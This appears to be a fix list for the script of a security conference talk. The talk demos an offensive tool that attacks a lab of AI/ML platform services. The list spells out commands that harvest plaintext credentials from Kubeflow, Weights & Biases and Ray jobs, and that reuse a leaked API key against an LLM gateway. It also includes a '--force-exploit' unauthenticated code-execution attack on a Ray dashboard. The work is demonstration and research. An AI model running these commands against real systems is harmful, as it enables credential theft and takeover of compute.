# Speaker Script — Required Fixes

Only the items that are wrong against the live tool. Every "live" value below was
run against the lab on the attack box this session. Ordered by severity.

---

## 🔴 FIX 1 — "29 endpoints" is wrong; live it's 21 (4 places)

The tool prints `Running templates against 21 service identity(s)`. Anywhere the
script says **29 AI/ML endpoints / 29 workflow targets**, change to **21**.

Occurrences:
- Slide 2 — "twenty-nine AI and ML endpoints on one subnet"
- Slide 7 — "twenty-nine AI and ML endpoints between them"
- Slide 10 POINT — "twenty-nine identified services"
- Slide 10 POINT — "workflow targets: twenty-nine generated"

→ Use **twenty-one** in all four.

---

## 🔴 FIX 2 — Demo A: command vs. on-screen output mismatch (Slide 10)

The slide mockup shows a typed "Discovery Summary / families / workflow targets"
block. That block comes from **`assess network`**, not `discover network`.
`discover network` shows the vuln-scan template lines, not that summary.

Pick ONE:
- **Option A (recommended):** change the command to
  `aipostex assess network --target 172.16.50.0/24 --mode detect`
  so the command matches the summary-style output on the slide.
- **Option B:** keep `discover network` and change the slide + POINTs to describe
  the template-scan output it actually prints (HIGH/MED findings + gated commands).

Either way: the **"Mode: Detection Only … gated behind --force-exploit"** beat is
accurate and prints live — keep it.

---

## 🔴 FIX 3 — Demo C: rebuild it, and make Ray the dual-angle finale (Slide 12)

The original three commands don't deliver: `mlflow enum` shows `run_count=0` (drop
it), and the old Ray beats understated what the tool does. As of the latest build
(verified live this session), Ray now both **harvests credentials** *and*
**confirms remote code execution** — so Ray closes the demo on two angles.

**New Demo C — four beats, each verified live. Secrets across three services, then
Ray escalates to compute takeover:**

```
SAY    Demo C — same idea as B, wider blast radius. One host, four teams, and they
       share secrets without realizing it. Three services that leak credentials —
       then the one that does something worse.

RUN    aipostex kubeflow --target http://172.16.50.20:9000 pipelines
SAY    Kubeflow orchestrates ML pipelines on Kubernetes. `pipelines` reads back the
       pipeline definitions and the parameters they run with.
POINT  The parameters carry secrets in plaintext:
       churn-model-retraining → HF_TOKEN, SNOWFLAKE_CONN_STR
       fraud-detection-bert   → AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY

RUN    aipostex wandb --target http://172.16.50.20:8444 secrets \
         --entity acme-ml-team --project churn-prediction
SAY    Weights & Biases is the experiment tracker — every run logs its config there.
       `secrets` scans those run configs.
POINT  6 embedded secrets, each named and tied to its run:
       WANDB_API_KEY, OPENAI_API_KEY, HF_TOKEN, AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY.

RUN    aipostex ray --target http://172.16.50.20:8265 jobs
SAY    Ray is the distributed-compute framework — where training jobs actually run.
       Each job carries a runtime environment; `jobs` reads what's in it.
POINT  Biggest single haul — 3 CRITICAL findings, 14 credentials lifted straight out
       of the jobs' runtime_env, printed inline: AWS keys, Postgres, Snowflake, Vault
       token, Kafka SASL, HF, W&B, Stripe, Datadog, Sentry, Redis, Seldon, PagerDuty.

SAY    So far that's exposure — secrets you can read. The last one is different.

RUN    aipostex ray --target http://172.16.50.20:8265 cluster-info --force-exploit
SAY    The only command behind --force-exploit, because it doesn't read — it acts.
       It submits a job to that same Ray dashboard, no credentials, and Ray runs it
       on a worker node.
POINT  CRITICAL · execution-confirmed: "Ray cluster takeover — unauthenticated remote
       code execution confirmed." The job ran on their machine and reported back from
       inside the cluster — running as mluser@ailab-ml, Linux-6.8 kernel. The payload
       was harmless; the point is I chose it. The same path runs ANY code on their
       training compute — the GPUs.
```

**The dual angle:** beats 1–3 prove *secrets are everywhere*; beat 4 escalates Ray
specifically from "leaks credentials" to "I can run my code on your compute." That
last line is the talk's strongest: it's not data exposure, it's takeover.

Narrative: **one platform host → pipelines + experiment tracking + compute; every
layer leaks credentials, and the compute layer executes attacker code.** Update the
slide 12 mockup and SAY/POINT/IF-IT-BREAKS lines to these four commands.

Notes (verified live this session):
- `ray jobs` and `cluster-info` now print **full evidence inline** — no `--format
  json | jq` step needed to show the credentials or the RCE output.
- The cluster-info job succeeds because the payload proves execution with stdlib
  host identity (it does not require the `ray` module inside the job). It reports
  `ray_api_error: No module named 'ray'` in its output — that's expected and
  harmless; the host identity is the proof.
- ⚠️ Ray job history is ephemeral (a cluster restart wipes it). If the lab Ray was
  restarted, re-seed before the talk so `ray jobs` has the 14 creds:
  from proxmox → `ssh labadmin@172.16.50.20 'sudo /opt/ailab-ml/venv/bin/python3
  ~/lab/ml-platform/seed_ray.py localhost 8265'`.

---

## 🟡 FIX 4 — Demo B: ADD `enum` before `generate` (Slide 11)

Keep the existing read-notebook → generate flow. **Insert one `enum` beat in the
middle** to show the blast radius, then run generate (smollm) as the finale exactly
as before. This is an addition, not a swap. (The script's current Slide 11 uses
`auth-sweep` — replace that line with `enum`; `auth-sweep` undercuts the story by
revealing the proxy accepts no-auth too.)

New three-beat flow:

```
RUN  aipostex jupyter --target http://172.16.50.10:8888 \
        read-notebook --path notebooks/rag-prototype.ipynb
POINT  3 secrets mined — Anthropic, OpenAI, PostgreSQL — each read-confirmed.

RUN  aipostex openai-compat --target http://172.16.50.20:4000 \
        --api-key sk-proj-FAKE-notebook-key-1234567890abcdef enum
POINT  6 models exposed, 4 of them frontier — bedrock-claude, claude-sonnet,
       gpt-4, gpt-4o. One forgotten key → the whole model catalog, on their bill.
SAY    "You could run inference on any of these. For the demo I'll use the local model."

RUN  aipostex openai-compat --target http://172.16.50.20:4000 \
        --api-key sk-proj-FAKE-notebook-key-1234567890abcdef \
        generate --model local-smollm \
        --prompt "Explain what access this proxy gives me in one sentence." \
        --force-exploit
POINT  status=200, success=true — inference executed through the gateway.
```

⚠️ IF IT BREAKS / do-not-do: never run `generate` against gpt-4o or claude-sonnet
live — the proxy advertises them (enum) but has no upstream creds, so generate
returns a 401→429 error wall. enum proves they're exposed; smollm is the safe finale.

Keep the closing: "no credential typed by hand; the notebook produced the key, the
workflow carried it to the gateway." Notebook secret types are correct — no change.

---

## 🟡 FIX 5 — Template split is wrong (Slide 13 + backup)

Script: "123 templates — 65 detection, 58 exploitation."
Live: **123 = 62 detection / 61 exploit.**
→ Change to **62 detection, 61 exploit** (total 123 is correct).

---

## 🟢 Cosmetic (slides, not narration)

- Use bare **`aipostex`** everywhere (slide 11 mixes `./aipostex` and `aipostex`).
  It's on PATH on the attack box.
- Slide 12 right-rail header renders as `\]CREDENTIAL REUSE` — fix the escaping.

---

## Verified-correct (leave as-is)
- Demo A "Detection Only / gated behind --force-exploit" — true, prints live.
- Demo B notebook → 3 secrets (Anthropic / OpenAI / PostgreSQL) — exact match.
- kubeflow pipelines secret values — exact match.
- Planted-findings count deliberately unstated — keep.
